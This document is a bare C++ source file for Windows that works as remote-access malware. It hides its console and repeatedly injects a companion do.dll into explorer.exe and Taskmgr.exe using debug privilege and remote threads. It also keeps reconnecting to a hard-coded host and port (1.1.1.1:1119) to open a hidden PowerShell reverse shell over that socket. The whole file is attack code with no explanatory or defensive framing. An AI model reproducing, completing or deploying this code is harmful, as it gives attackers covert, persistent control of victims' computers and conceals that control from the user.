#include <ws2tcpip.h>
#include <windows.h>
#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <process.h>
#include <iostream>
#include <string>
#include <wchar.h>
#include <Shlwapi.h>
#include <TlHelp32.h>
#include <Psapi.h>
#include <Userenv.h>

#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Shlwapi.lib")
#pragma comment(lib, "Psapi.lib")
#pragma comment(lib, "Userenv.lib")

std::string commander = "1.1.1.1";
std::string street = "1119";

#define print(format, ...) fprintf (stderr, format, __VA_ARGS__)

bool IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    return fRet;
}

bool EnableDebugPrivilege() {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return false;

    TOKEN_PRIVILEGES tp;
    LUID luid;
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luid))
        return false;

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Luid = luid;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

    if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL))
        return false;

    CloseHandle(hToken);
    return true;
}

DWORD GetProcId(const wchar_t* pn, unsigned short int fi = 0b1101) {
    DWORD procId = 0;
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pE;
        pE.dwSize = sizeof(pE);

        if (Process32FirstW(hSnap, &pE)) {
            if (!pE.th32ProcessID)
                Process32NextW(hSnap, &pE);
            do {
                if (fi == 0b10100111001)
                    wcout << pE.szExeFile << L"\t\t" << pE.th32ProcessID << endl;
                if (!_wcsicmp(pE.szExeFile, pn)) {
                    procId = pE.th32ProcessID;
                    print("Process Found: %lu\n", pE.th32ProcessID);
                    break;
                }
            } while (Process32NextW(hSnap, &pE));
        }
    }
    CloseHandle(hSnap);
    return procId;
}

BOOL InjectDLL(DWORD procID, const char* dllPath) {
    BOOL WPM = 0;

    HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, 0, procID);
    if (hProc == INVALID_HANDLE_VALUE) {
        return -1;
    }
    void* loc = VirtualAllocEx(hProc, 0, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    WPM = WriteProcessMemory(hProc, loc, dllPath, strlen(dllPath) + 1, 0);
    if (!WPM) {
        CloseHandle(hProc);
        return -1;
    }
    print("DLL Injected Successfully at %p\n", loc);
    HANDLE hThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)LoadLibraryA, loc, 0, 0);
    if (!hThread) {
        VirtualFreeEx(hProc, loc, strlen(dllPath) + 1, MEM_RELEASE);
        CloseHandle(hProc);
        return -1;
    }
    print("Thread Created Successfully with ID %lu\n", GetThreadId(hThread));
    CloseHandle(hProc);
    VirtualFreeEx(hProc, loc, strlen(dllPath) + 1, MEM_RELEASE);
    CloseHandle(hThread);
    return 0;
}

DWORD WINAPI InjectionMonitor(LPVOID lpParam) {
    std::string* dllPath = (std::string*)lpParam;
    EnableDebugPrivilege();

    while (true) {
        DWORD explorerPID = GetProcId(L"explorer.exe");
        if (explorerPID != 0) {
            if (InjectDLL(explorerPID, dllPath->c_str()) != 0) {
                Sleep(1000);
                continue;
            }
        }

        DWORD taskmgrPID = GetProcId(L"Taskmgr.exe");
        if (taskmgrPID != 0) {
            InjectDLL(taskmgrPID, dllPath->c_str());
        }
        Sleep(100);
    }
    return 0;
}

void CreatePowerShellSession(SOCKET ConnectSocket) {
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    SIZE_T attributeSize;
    ZeroMemory(&si, sizeof(STARTUPINFOEXA));
    ZeroMemory(&pi, sizeof(PROCESS_INFORMATION));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);

    // Set up handles for redirection
    si.StartupInfo.dwFlags = STARTF_USESTDHANDLES;
    si.StartupInfo.hStdInput = (HANDLE)ConnectSocket;
    si.StartupInfo.hStdOutput = (HANDLE)ConnectSocket;
    si.StartupInfo.hStdError = (HANDLE)ConnectSocket;

    // Get current process token to duplicate
    HANDLE hProcessToken = NULL;
    HANDLE hPrimaryToken = NULL;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_DUPLICATE | TOKEN_QUERY, &hProcessToken)) {
        // Duplicate the token to create a primary token
        DuplicateTokenEx(hProcessToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hPrimaryToken);
        CloseHandle(hProcessToken);
    }

    LPPROC_THREAD_ATTRIBUTE_LIST lpAttributeList = NULL;
    InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
    lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
    InitializeProcThreadAttributeList(lpAttributeList, 1, 0, &attributeSize);

    if (hPrimaryToken) {
        UpdateProcThreadAttribute(lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_TOKEN, &hPrimaryToken, sizeof(HANDLE), NULL, NULL);
    }

    si.lpAttributeList = lpAttributeList;

    // Create the process
    CreateProcessA(NULL,
        (LPSTR)"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoExit -NoLogo -WindowStyle Hidden",
        NULL, NULL, TRUE,
        EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW,
        NULL, NULL, &si.StartupInfo, &pi);

    if (hPrimaryToken) {
        CloseHandle(hPrimaryToken);
    }
    if (lpAttributeList) {
        DeleteProcThreadAttributeList(lpAttributeList);
        HeapFree(GetProcessHeap(), 0, lpAttributeList);
    }

    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}

int main() {
    FreeConsole();

    char currentPath[MAX_PATH];
    GetModuleFileNameA(NULL, currentPath, MAX_PATH);
    PathRemoveFileSpecA(currentPath);
    std::string dllPath = std::string(currentPath) + "\\do.dll";

    if (GetFileAttributesA(dllPath.c_str()) == INVALID_FILE_ATTRIBUTES)
        return -1;

    HANDLE hThread = CreateThread(NULL, 0, InjectionMonitor, &dllPath, 0, NULL);
    if (!hThread)
        return -1;

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
        return -1;

    while (true) {
        struct addrinfo* out = NULL, hints;
        memset(&hints, 0, sizeof(hints));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_protocol = IPPROTO_TCP;

        if (getaddrinfo(commander.c_str(), street.c_str(), &hints, &out) != 0) {
            Sleep(5000);
            continue;
        }

        SOCKET ConnectSocket = WSASocket(out->ai_family, out->ai_socktype, out->ai_protocol, NULL, NULL, NULL);
        if (ConnectSocket == INVALID_SOCKET) {
            freeaddrinfo(out);
            Sleep(5000);
            continue;
        }

        if (connect(ConnectSocket, out->ai_addr, (int)out->ai_addrlen) == SOCKET_ERROR) {
            closesocket(ConnectSocket);
            freeaddrinfo(out);
            Sleep(5000);
            continue;
        }

        CreatePowerShellSession(ConnectSocket);
        closesocket(ConnectSocket);
        freeaddrinfo(out);
    }

    WSACleanup();
    return 0;
}